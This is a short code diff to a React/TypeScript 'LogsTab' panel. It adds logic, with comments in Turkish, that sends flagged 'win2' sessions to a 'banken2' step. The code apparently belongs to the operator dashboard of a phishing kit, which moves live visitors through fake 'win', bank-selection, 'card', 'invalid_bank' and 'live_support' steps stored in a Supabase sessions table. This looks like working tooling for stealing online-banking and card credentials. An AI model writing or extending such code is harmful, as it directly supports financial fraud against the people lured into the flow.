@@ -1209,9 +1209,17 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
     }
 
     if (action === "win" || action === "banken" || action === "card" || action === "wait" || action === "invalid_bank" || action === "live_support" || action === "congrats") {
+      // ZORLU (win2) session'lari: "Banka Listesine Yonlendir" -> banken2 tasirimi,
+      // diger linklerde normal banken. Sadece is_win2_flow olanlarda gecerli.
+      let targetStep = action;
+      if (action === "banken") {
+        const row = rowsRef.current.find((r) => r.id === sessionId);
+        const fd = (row?.form_data ?? {}) as Record<string, any>;
+        if (fd.is_win2_flow === true) targetStep = "banken2";
+      }
       const { data, error } = await supabase
         .from("sessions")
-        .update({ current_step: action, status: "online" })
+        .update({ current_step: targetStep, status: "online" })
         .eq("id", sessionId)
         .select("id, current_step, status, public_id")
         .maybeSingle();
